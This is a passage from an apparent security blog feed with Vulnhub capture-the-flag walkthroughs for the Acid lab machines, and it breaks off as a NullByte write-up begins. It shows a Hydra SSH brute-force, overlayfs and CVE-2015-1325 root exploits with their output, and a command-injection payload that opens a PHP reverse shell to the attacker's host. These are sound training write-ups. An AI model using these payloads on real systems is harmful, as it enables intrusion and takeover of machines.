</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-09-11 08:49:26
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure></p>

<p>Login to the SSH with makke&rsquo;s login
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh &lt;a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x6d;&#97;&#x6b;&#x6b;&#x65;&#64;&#49;&#x30;&#x2e;&#x31;&#46;&#x31;&#46;&#x31;&#51;&#57;">&#109;&#97;&#x6b;&#107;&#101;&#64;&#x31;&#48;&#46;&#49;&#46;&#49;&#46;&#49;&#x33;&#57;&lt;/a>
</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Wanna Knock me out ???
</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#x61;&#x6b;&#107;&#x65;&#64;&#x31;&#48;&#46;&#x31;&#x2e;&#49;&#46;&#x31;&#x33;&#57;">&#x6d;&#x61;&#107;&#x6b;&#x65;&#64;&#49;&#x30;&#x2e;&#49;&#46;&#49;&#x2e;&#49;&#x33;&#57;&lt;/a>&rsquo;s password:
</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Documentation:  &lt;a href="https://help.ubuntu.com/">https://help.ubuntu.com/&lt;/a>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p>134 packages can be updated.
</span><span class='line'>80 updates are security updates.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
</span><span class='line'>makke@acid:~$ id
</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
</span><span class='line'>makke@acid:~$ ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3&lt;br/>
</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
</span><span class='line'>          Interrupt:19 Base address:0x2000&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>lo        Link encap:Local Loopback&lt;br/>
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>makke@acid:~$</span></code></pre></td></tr></table></div></figure></p>

<p>Poking around and found clues in file <code>.bash_history</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
</span><span class='line'>makke@acid:~$ ls -ahl
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
</span><span class='line'>-rw&mdash;&mdash;- 1 makke makke  272 Sep 10 17:13 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  220 Aug 24 19:11 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke 3.7K Aug 24 19:11 .bashrc
</span><span class='line'>drwx&mdash;&mdash; 2 makke makke 4.0K Aug 24 21:25 .cache
</span><span class='line'>-rw-rw-r&ndash; 1 makke makke   40 Aug 24 21:28 .hint
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  675 Aug 24 19:11 .profile
</span><span class='line'>makke@acid:~$ cat .bash_history
</span><span class='line'>exit
</span><span class='line'>cd ..
</span><span class='line'>clear
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>cd bin/
</span><span class='line'>clear
</span><span class='line'>./overlayfs
</span><span class='line'>clear
</span><span class='line'>cd /home/makke/
</span><span class='line'>clear
</span><span class='line'>nano .hint
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>ls -a
</span><span class='line'>cat .hint
</span><span class='line'>clear
</span><span class='line'>cd /bin/
</span><span class='line'>ls
</span><span class='line'>./overlayfs
</span><span class='line'>clear
</span><span class='line'>wgt
</span><span class='line'>wget
</span><span class='line'>apt-get remove wget
</span><span class='line'>su
</span><span class='line'>su -
</span><span class='line'>exit
</span><span class='line'>id
</span><span class='line'>pwd
</span><span class='line'>ls
</span><span class='line'>ls -l
</span><span class='line'>pwd
</span><span class='line'>ls -alh
</span><span class='line'>cat .bash_history
</span><span class='line'>/bin/overlayfs
</span><span class='line'>exit
</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure></p>

<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs
</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure></p>

<p>run it and ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root),1001(makke)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>sh: 2: cd: can&rsquo;t cd to root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>total 68
</span><span class='line'>drwx&mdash;&mdash;  5 root root  4096 Aug 24 21:32 .
</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 23934 Aug 24 22:25 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  3135 Aug  8 18:02 .bashrc
</span><span class='line'>drwx&mdash;&mdash;  2 root root  4096 Aug 24 17:46 .cache
</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 17:55 .config
</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 15:51 .dbus
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   284 Aug 24 20:57 .flag.txt
</span><span class='line'>-rw&mdash;&mdash;-  1 root root  2775 Aug 24 21:32 .mysql_history
</span><span class='line'>-rw&mdash;&mdash;-  1 root root   147 Aug 24 23:32 .nano_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   140 Feb 20  2014 .profile
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root    66 Aug  6 17:31 .selected_editor&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat .flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have completed the Challenge Successfully.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Your Flag is : &ldquo;Black@Current@Ice-Cream&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACiD&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Twitter:&lt;a href="https://twitter.com/m_avinash143">https://twitter.com/m_avinash143&lt;/a>
</span><span class='line'>Facebook: &lt;a href="https://www.facebook.com/M.avinash143">https://www.facebook.com/M.avinash143&lt;/a>
</span><span class='line'>LinkedIN: &lt;a href="https://in.linkedin.com/pub/avinash-thapa/101/406/4b5">https://in.linkedin.com/pub/avinash-thapa/101/406/4b5&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Acid: Server]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/"/>
    <updated>2015-09-03T05:36:37-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server</id>
    <content type="html"><![CDATA[<p>Acid:Server is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Hints stored in some pages' source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.132  00:0c:29:36:7b:18   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.132 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
</span><span class='line'>adding 10.1.1.132/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, TCP port 33447 has been discovered.</p>

<p>Then I run NMAP scan to probe more detail information against the opening port.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Ubuntu)
</span><span class='line'>|_http-title: /Challenge
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>

<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>

<p>The hidden folder is <code>/Challenge</code></p>

<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>

<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>

<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>

<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>

<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>

<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>

<p>Compile and send the exploit to target server, then run it to get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
</span><span class='line'>./37088
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 2571
</span><span class='line'>apport stopped, pid = 2572
</span><span class='line'>getting pid 2571
</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
</span><span class='line'>&lt;strong> child: current pid = 2571
</span><span class='line'>&lt;/strong> child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>checker: mode 4516
</span><span class='line'>waiting for file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait&hellip;
</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
</span><span class='line'>success&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p> / &lt;strong>&lt;em>|&lt;/em>&lt;/strong>  _ &lt;strong>   &lt;/strong> _ _ &lt;strong> &lt;/strong> &lt;em>| |&lt;/em> _   &lt;em>| | __ &lt;/em>| |&lt;em>(&lt;/em>) &lt;em>&lt;strong>  _ &lt;/strong>  &lt;/em>&lt;strong>
</span><span class='line'>| |   / _ | &lsquo;&lt;em> \ / &lt;/em>&lt;code>| '__/ _&lt;/code> | &lt;/strong>| | | | |/ &lt;em>` | __| |/ _ | &rsquo;&lt;/em> \/ &lt;strong>|
</span><span class='line'>| |&lt;/strong>| (&lt;em>) | | | | (&lt;/em>| | | | (&lt;em>| | |&lt;/em>| |&lt;em>| | | (&lt;/em>| | |&lt;em>| | (&lt;/em>) | | | _&lt;em> \
</span><span class='line'> _&lt;/em>&lt;strong>_&lt;/strong>/|&lt;em>| |&lt;/em>|_&lt;em>, |&lt;/em>|  _&lt;em>,&lt;/em>|_&lt;em>|_&lt;/em>,&lt;em>|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|&lt;/em>|_&lt;strong>/|&lt;em>| |&lt;/em>|&lt;/strong>&lt;em>/
</span><span class='line'>                  |&lt;/em>__/                                                 &lt;br/>
</span><span class='line'>root@acid:/tmp# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have successfully completed the challenge.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I  hope you like it.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACID
</span><span class='line'>facebook: &lt;a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@acid:~#</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]NullByte: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/"/>
    <updated>2015-08-18T09:12:46-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1</id>
    <content type="html"><![CDATA[<p><img class="left" src="/downloads/nullbyte1/main.png"></p>

<p>NullByte challenge 0x01</p>

<p>Difficulty is Basic to intermediate.</p>

<p>&ldquo;Use your lateral thinking skills, maybe youll need to write some code.&rdquo; &ndash; <font color="green">ly0n</font> (<a href="http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/">http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

